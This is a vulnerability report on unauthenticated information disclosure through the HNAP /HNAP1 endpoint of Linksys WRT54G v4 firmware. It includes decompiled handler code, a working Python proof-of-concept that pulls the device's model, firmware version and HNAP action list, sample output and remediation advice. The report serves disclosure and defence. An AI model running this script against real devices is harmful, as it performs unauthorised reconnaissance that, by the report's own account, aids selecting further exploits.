# Vulnerability Report — Linksys WRT54Gv4 Unauthenticated HNAP Information Disclosure

## 1. Basic Information

- **Vendor / Product:** Linksys WRT54G v4, web management interface (`/usr/sbin/httpd`).
- **Affected Versions:** Firmware `4.21.5.000` (2012-02-20). 
- **Vulnerability Type:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- **Attack Vector:** Remote (Network), **unauthenticated**.

## 2. Description

The HNAP `GET /HNAP1` handler serves the `GetDeviceSettings` discovery response — device name, vendor, model, firmware version, type, presentation URL, and the full list of supported HNAP actions — with no authentication. 

## 3. Root Cause Analysis

Binary: `/usr/sbin/httpd`. Function: `HNAP_GET_request_handler @ 0x4466c8` (calls
`send_get_device_settings_reply @ 0x441904`).

```c
if ( !strcasecmp(url, "/HNAP1") || !strcasecmp(url, "/HNAP1/") ) {
    if ( ssl_request
      || (!is_lan || https_enable != "1")
      && (is_lan || remote_mgt_https != "1") )
    {
        send_get_device_settings_reply(conn);   // <-- NO auth check; no basic_auth_fail gating
        return 1;
    }
}
```

The branch returns the device settings unconditionally; the `basic_auth_fail` / credential check applied to other routes is absent here.

## 4. Proof of Concept
```python
import argparse, re, sys
import requests

def text_of(xml, tag):
    m = re.search(r"<%s>(.*?)</%s>" % (tag, tag), xml, re.S)
    return m.group(1).strip() if m else None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://192.168.1.1",
                    help="base URL of the WRT54G web UI (FirmAE: http://192.168.1.1)")
    ap.add_argument("--timeout", type=int, default=5)
    a = ap.parse_args()
    base = a.target.rstrip("/")

    r1 = requests.get(base + "/HNAP1", timeout=a.timeout, allow_redirects=False)
    print(f"[*] GET /HNAP1 (no creds) -> HTTP {r1.status_code}  Content-Type={r1.headers.get('Content-Type')}")
    xml = r1.text

    fields = ["DeviceName", "VendorName", "ModelName", "ModelDescription",
              "FirmwareVersion", "Type", "PresentationURL"]
    leaked = {f: text_of(xml, f) for f in fields}
    leaked = {k: v for k, v in leaked.items() if v}

    print()
    if r1.status_code == 200 and leaked:
        print("[+] VERIFIED: unauthenticated device fingerprint leaked via GET /HNAP1:")
        for k, v in leaked.items():
            print(f"      {k:18}= {v}")
        actions = re.findall(r"<ActionName>(.*?)</ActionName>", xml)
        if actions:
            print(f"      SupportedActions   = {len(actions)} actions exposed (e.g. {actions[:3]})")
        print("[*] Impact: firmware/version disclosure -> exploit selection; full HNAP action map.")
        print("[*] Classification: unauthenticated information disclosure, not token/auth bypass.")
        sys.exit(0)
    else:
        print("[-] NOT reproduced — /HNAP1 did not return device settings without auth.")
        print("    body[:200]:", xml[:200].replace("\n", " "))
        sys.exit(1)

if __name__ == "__main__":
    main()
```

```bash
$ python3 poc_wrt54gv4_l6_unauth_hnap1.py --target http://192.168.1.1
[*] GET /HNAP1 (no creds) -> HTTP 200  Content-Type=text/xml
[+] VERIFIED: unauthenticated device fingerprint leaked via GET /HNAP1:
      DeviceName        = WRT54G
      VendorName        = Linksys by Cisco
      ModelName         = WRT54G
      FirmwareVersion   = v4.21.5
      Type              = GatewayWithWiFi
[*] Classification: unauthenticated information disclosure, not token/auth bypass.
```


## 5. Impact

**Unauthenticated information disclosure** of the firmware version, model, vendor, and the complete HNAP action list (attack-surface map), directly enabling exploit selection and chaining (e.g. matching a known firmware-specific HNAP command-injection or auth-bypass). On WAN-exposed devices this is the first reconnaissance step an attacker performs. 

## 6. Remediation

Require authentication for `GetDeviceSettings` (or restrict the HNAP discovery endpoint to the LAN and to authenticated sessions), and remove the firmware version / full action list from any unauthenticated response. At minimum, gate `HNAP_GET_request_handler` behind the same `basic_auth_fail` check applied to other routes.
